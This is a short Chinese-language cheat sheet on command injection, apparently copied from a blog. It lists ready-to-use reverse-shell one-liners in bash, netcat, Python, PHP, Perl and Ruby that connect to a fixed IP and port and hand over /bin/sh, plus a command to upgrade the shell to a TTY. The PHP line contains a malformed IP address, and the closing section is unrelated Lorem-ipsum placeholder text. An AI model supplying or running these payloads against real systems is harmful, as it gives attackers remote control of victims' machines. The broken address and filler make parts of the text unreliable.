# 命令注入

> From https://www.smi1e.top/linux-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/


## 反弹shell

```bash
nc -lvvp 8080 -t -e /bin/bash
bash -i >& /dev/tcp/192.168.86.131/8080 0>&1
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.86.131",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
php -r '$sock=fsockopen("192.168.786131",8080);exec("/bin/sh -i <&3 >&3 2>&3");' #代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6
perl -e 'use Socket;$i="192.168.86.131";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e'f=TCPSocket.open("192.168.86.131",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

将shell变成tty交互式shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")' 
```

## Section 2

Nulla vitae elit libero, a pharetra augue. Cras justo odio, dapibus ac facilisis in, egestas eget quam. Cras mattis consectetur purus sit amet fermentum. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
